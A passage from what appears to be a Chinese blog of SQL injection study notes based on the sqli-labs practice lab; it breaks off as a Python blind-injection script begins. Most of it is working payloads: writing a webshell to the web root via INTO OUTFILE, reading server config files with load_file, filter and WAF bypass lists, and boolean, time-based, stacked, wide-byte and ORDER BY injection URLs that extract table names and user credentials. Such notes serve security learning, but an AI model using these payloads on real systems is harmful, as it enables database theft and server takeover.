<h3 id="3、导入到文件"><a href="#3、导入到文件" class="headerlink" title="3、导入到文件"></a>3、导入到文件</h3><p>SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。 </p>
<p>我们一般有两种利用形式：</p>
<p> 第一种直接将 select 内容导入到文件中</p>
<p>Select version() into outfile “c:\phpnow\htdocs\test.php”</p>
<p>此处将 version()替换成一句话，也即</p>
<p>Select  into outfile “c:\phpnow\htdocs\test.php”</p>
<p>Select  into outfile “c:\phpnow\htdocs\test.php</p>
<p><strong>第二种修改文件结尾</strong>：</p>
<p> Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文 件</p>
<p> 解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY </p>
<p>16 进制可以为一句话或者其他任何的代码，可自行构造。在 sqlmap 中 os-shell 采取的就是 这样的方式，具体可参考 os-shell 分析文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法一：写入木马：http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,2,&#x27;一句话木马&#x27; into outfile &quot;c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php&quot;--+</span><br><span class="line"></span><br><span class="line">方法二：文件导入：http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,database(),3 into outfile &quot;c:\\wamp\\www\\sqlli b\\Less-7\\uuu.txt&quot;%23</span><br></pre></td></tr></table></figure>

<p>TIPS： </p>
<p>（1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语 句： select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile ‘c:\wamp\www\test.php’ </p>
<p>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini 当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累</p>
<h2 id="sql注入绕过大全"><a href="#sql注入绕过大全" class="headerlink" title="sql注入绕过大全"></a>sql注入绕过大全</h2><p><strong>基本绕过方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.大小写</span><br><span class="line">2.双写</span><br><span class="line">3.编码，如URLEncode编码，ASCII编码绕过</span><br><span class="line">4.内敛注释</span><br></pre></td></tr></table></figure>

<p><strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.用注释替换空格</span><br><span class="line">select/**/user,password/**/from /**/users;</span><br><span class="line">2.空格url编码%20</span><br><span class="line">3.两个空格代替一个空格</span><br><span class="line">4.用Tab代替空格</span><br><span class="line">5.%a0=空格</span><br><span class="line">6.如果空格被过滤，括号没有被过滤，可以用括号绕过</span><br><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">7.回车</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>引号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.使用十六进制</span><br><span class="line">例如：</span><br><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">如引号被过滤，就可以尝试使用十六进制来进行绕过</span><br><span class="line">即可以将语句写为：</span><br><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br><span class="line"></span><br><span class="line">2.还有一个办法（前提是已经得知数据库名称和表名，例如dvwa和users）：</span><br><span class="line">select column_name from information_schema.columns where table_schema=database();</span><br><span class="line">查询所在数据库中的所有列名,然后</span><br><span class="line">可以猜或者尝试得知哪些字段在哪个表中，然后：</span><br><span class="line">select username,password from users;</span><br><span class="line"></span><br><span class="line">3.宽字节注入</span><br></pre></td></tr></table></figure>

<p><strong>逗号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit,这些子句方法都需要使用到逗号</span><br><span class="line"></span><br><span class="line">对于substr()和mid()这两个方法可以使用from的方式来解决：</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">使用join</span><br><span class="line">union select 1,2 可以使用下面的句子代替</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">使用like</span><br><span class="line">select ascii(mid(user(),1,1))=80 可以使用下面的句子代替</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br><span class="line"></span><br><span class="line">limit中，使用offset绕过</span><br><span class="line">limit 1offset0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>or and xor not 绕过</strong>**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用符号替换and = &amp;&amp; or=|| xor=| not=!</span><br><span class="line">在敏感词中添加注释：an/**/d</span><br><span class="line">双写绕过oorr</span><br><span class="line">大小写变形</span><br><span class="line">编码</span><br></pre></td></tr></table></figure>

<p><strong>注释符绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1 即虽然无法使用注释符，但是可以闭合掉他</span><br><span class="line">或者：id=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">最后添加or 1&#x27;</span><br><span class="line">最后添加 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>等号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用like</span><br><span class="line">使用!&lt;&gt;,因为&lt;&gt;是不等于</span><br><span class="line">regrep (正则表达匹配)</span><br></pre></td></tr></table></figure>

<p>&lt;&gt;<strong>被过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),第一个参数小于第二个参数，返回-1，否则为1</span><br><span class="line">in，between a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43条消息) SQL注入–绕过技巧_雪碧可乐_的博客-CSDN博客_sql注入绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fastergohome/article/details/102514160">(44条消息) CTF 中的 SQL 注入总结_重新启程-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AikN/p/15725756.html">https://www.cnblogs.com/AikN/p/15725756.html</a>)</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-12">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</span><br><span class="line"></span><br><span class="line">2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</span><br><span class="line"></span><br><span class="line">3、判断字符型注入还是数字型注入（2-1，’是否正常）</span><br><span class="line"></span><br><span class="line">4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</span><br><span class="line"></span><br><span class="line">5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</span><br><span class="line"></span><br><span class="line">6、进行fuzz，看看那些被waf了</span><br><span class="line"></span><br><span class="line">7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</span><br><span class="line"></span><br><span class="line">8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</span><br><span class="line"></span><br><span class="line">9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</span><br><span class="line"></span><br><span class="line">10、先在bp中跑一遍看是否有结果</span><br><span class="line"></span><br><span class="line">11、尝试写脚本</span><br></pre></td></tr></table></figure>

<h2 id="boolean注入"><a href="#boolean注入" class="headerlink" title="boolean注入"></a><strong>boolean注入</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断方式：</span><br><span class="line">   通过长度判断 length(): length(database())&gt;=x</span><br><span class="line">   通过字符判断 substr():substr(database() ,1,1)= &#x27;s&#x27;</span><br><span class="line">   通过 ascII 码判断:ascii():ascii(substr(database(),1,1)) =x </span><br><span class="line">   注入漏洞判断：</span><br><span class="line">   1.id=1&#x27;   报错 </span><br><span class="line">   2.id=1 and 1=1  结果和 id=1 一样</span><br><span class="line">   3.id=1 and 1=2  结果异常</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A:判断数据库名的长度 http://xxxxxx?id=1&#x27; and length(database())&gt;=1--+  从而判 断数据库名的长度为 4</span><br><span class="line">  B:判断数据库名 Substr() 数据库库名 a~z,0~9 ‘and substr(database(),1,1)--+ </span><br><span class="line">  C:Burp 判断数据库名 http://xxxxxxxx?id=1&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+ 逐字判断数据库名为 test，test 数据库名 </span><br><span class="line">  D:Burpsuite 爆破数据库的表名 http://xxxxxx?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ person     users   xss  //三个表</span><br><span class="line">  E:Burp 爆字段名 http://xxxxxxxx?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+ id   username  password 等</span><br><span class="line">  F:获取数据 http://xxxxx?id=1&#x27; and substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;--+ </span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有 当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query()函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所 以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库名：test http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)</span><br><span class="line"> 爆表名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆字段名 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; where table_name=&#x27;user&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br><span class="line"> 爆值 http://127.0.0.1/web/sql/duidie.php?id=1;select if(substr((select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) </span><br></pre></td></tr></table></figure>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路： 1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成**%df**%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<p> 2、将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass的一种方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?id=-1%df%27union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure>

<p><strong>post型</strong></p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。 我们用万能密码的方式的来突这一关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">� &#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p>mysql设置成了gbk，但是用 mysql_real_escape_string()对特殊字符进行了过滤</p>
<ul>
<li><p>\x00</p>
</li>
<li><p>\n</p>
</li>
<li><p>\r</p>
</li>
<li><p>\</p>
</li>
<li><p>‘</p>
</li>
<li><p>‘’</p>
</li>
<li><p>\x1a</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload：</span><br><span class="line">?id=-1%EF%BF%BD%27union%20select%201,user(),3--+</span><br><span class="line">Payload：</span><br><span class="line">?id=-1%df%27union%20select%201,user(),3--+</span><br></pre></td></tr></table></figure></li>
</ul>
<p>宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产 生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为‚\‛），MYSQL 默认字符集是 GBK 等宽字节字符集。 输入%df%27,本来\ 会转义%27（’），但\（其中\的十六进制是 %5C）的编码位数为 92，%df 的 编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节 64-254），会解析 为一个汉字‚運‛，这样\就会是去应有的作用。 id=1’ id=1%df%5c’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1 </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1’ </span><br><span class="line">127.0.0.1/web/sql/kuanzifu.php?id=1%df’</span><br><span class="line"> 从返回的结果可以看出，参数 id=1 在数据库查询是被单引号包围的。当传入参数 id=1’时， 传入的单引号又被转义符（反斜线）转义，导致参数 ID 无法逃逸单引号的包围，所以在一般情况下， 此处是不存在 SQL 注入漏洞的。不过有一个特例，就是当数据库的编码为 GBK 时，可以使用宽字节 注入，宽字节的格式是在地址后先加一个%df,再加单引号，因为反斜杠的编码为%5c,而在 GBK 编码 中，%df%5c 是繁体字連，所以这时，单引号成功逃逸，爆出 Mysql 数据库错误。</span><br><span class="line">  %df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&#x27;</span><br><span class="line">   $sql=&quot;SELECT * FROM users WHERE id=&#x27;1 運&#x27;&#x27; LIMIT 0,1&quot;; #成功将单引号闭合，可以进行 SQL 注入。</span><br><span class="line">    判断数据库表有 6 个字段数 http://127.0.0.1/web/sql/kuanzifu.php?id=1%df%27%20order%20by%207--+</span><br><span class="line">     http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,4,5,6--+ </span><br><span class="line">    爆库名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df%27%20union%20select%201,2,3,(databas e()),5,6--+</span><br><span class="line">    爆表名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=(select database())),5,6%23</span><br><span class="line">    爆字段名 http://127.0.0.1/web/sql/kuanzifu.php?id=-1%df&#x27; union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 1,1)),5,6%23 </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397815893?utm_source=qq&utm_medium=social&utm_oi=1204405106541780992">Web漏洞之SQL注入详解 - 知乎 (zhihu.com)</a></p>
<h2 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">★addslashes()</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">预定义字符是：</span><br><span class="line"> 单引号（&#x27;）</span><br><span class="line"> 双引号（&quot;）</span><br><span class="line"> 反斜杠（\）</span><br><span class="line"> NULL</span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可</span><br><span class="line">以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">语法：addslashes(string)</span><br><span class="line">参数 描述</span><br><span class="line">Mysql 注入---sqlilabs---lcamry</span><br><span class="line"></span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">返回值： 返回已转义的字符串。</span><br><span class="line">PHP 版本： 4+</span><br><span class="line"></span><br><span class="line">★stripslashes()</span><br><span class="line">函数删除由 addslashes() 函数添加的反斜杠。 </span><br><span class="line"></span><br><span class="line">★mysql_real_escape_string()</span><br><span class="line">函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r </span><br><span class="line">\ </span><br><span class="line">&#x27; </span><br><span class="line">&quot; </span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line">语法：mysql_real_escape_string(string,connection)</span><br><span class="line">参数 描述</span><br><span class="line">string 必需。规定要转义的字符串。</span><br><span class="line">connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</span><br><span class="line">说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用</span><br><span class="line">于 mysql_query()</span><br></pre></td></tr></table></figure>

<h2 id="or-and-过滤"><a href="#or-and-过滤" class="headerlink" title="or and 过滤"></a>or and 过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形 Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号 and=&amp;&amp; or=||</span><br><span class="line">(5)双写</span><br></pre></td></tr></table></figure>

<h2 id="服务器（两层）架构"><a href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><p>第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache Mysql 注入—sqlilabs—lcamry 64 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回 路径则相反</p>
<p>?id=1&amp;id=-2%27union%20select%201,user(),3–+</p>
<h2 id="order-by-后的-injectio"><a href="#order-by-后的-injectio" class="headerlink" title="order by 后的 injectio"></a>order by 后的 injectio</h2><p>我们可利用 order by 后的一些参数进行注入。</p>
<h3 id="（1）order-by-后的数字可以作为一个注入点。"><a href="#（1）order-by-后的数字可以作为一个注入点。" class="headerlink" title="（1）order by 后的数字可以作为一个注入点。"></a>（1）order by 后的数字可以作为一个注入点。</h3><p>也就是构造 order by 后的一个语句，让 该语句执行结果为一个数，我们尝试 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1</a>) 没有报错，但是 right 换成 left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我 们可以用报错注入和延时注入。 此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式， </p>
<p>①直接添加注入语句，?sort=(select ******) </p>
<p>②利用一些函数。例如 rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是</p>
<p>③利用 and，例如?sort=1 and (加 sql语句）</p>
<p><strong>报错注入例子</strong></p>
<p>?sort=(select%20count(*)%20from%20information_schema.co lumns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))</p>
<p>?sort=rand(ascii(left(database(),1))=115)</p>
<p><strong>and rand 相结合的方式，</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（$sql = &quot;SELECT * FROM users ORDER BY &#x27;$id&#x27;&quot;;）</span><br><span class="line"></span><br><span class="line">payload：http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1% 27and%20rand(ascii(left(database(),1))=115)--+</span><br><span class="line"></span><br><span class="line">②可以利用报错的方式进行</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20count(*)%20from%20informati</span><br><span class="line">on_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(ran</span><br><span class="line">d()*2)))--+</span><br><span class="line"></span><br><span class="line">③延时注入</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20If(ascii(substr(database(),1,1))=115,0,sleep</span><br><span class="line">(5))--+</span><br></pre></td></tr></table></figure>

<p><strong>延时注入例子</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">延时注入例子</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-46/?sort=%20(SELECT%20IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5(%271%27)),null)%20FROM%20(select%20database()%20as%20curr</span><br><span class="line">ent)%20as%20tb1)</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqllib/Less-46/?sort=1%20and%20If(ascii(substr(database(),1,1))=116,0,sleep</span><br><span class="line">(5))</span><br></pre></td></tr></table></figure>

<h3 id="（2）procedure-analyse-参数后注入"><a href="#（2）procedure-analyse-参数后注入" class="headerlink" title="（2）procedure analyse 参数后注入"></a>（2）procedure analyse 参数后注入</h3><p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 orde r by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以 利用 procedure analyse 进行注入。 </p>
<p>以下为示范例</p>
<p> <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),con">http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),con</a> cat(0x3a,version())),1)</p>
<h3 id="（3）导入导出文件-into-outfile-参数"><a href="#（3）导入导出文件-into-outfile-参数" class="headerlink" title="（3）导入导出文件 into outfile 参数"></a>（3）导入导出文件 into outfile 参数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:%5C%5Cwamp%5C%5Cwww%5C%5Csqllib%5C%5Ctest">http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:\\wamp\\www\\sqllib\\test</a> 1.txt%22</p>
<p>那这个时候我们可以考虑上传网马，利用 lines terminated by。 Into outtfile c:\wamp\www\sqllib\test1.txt lines terminated by 0x(网马进行 16 进制转 换)</p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#然后是二分法，二分法要快很多：</span></span><br><span class="line"><span class="comment"># 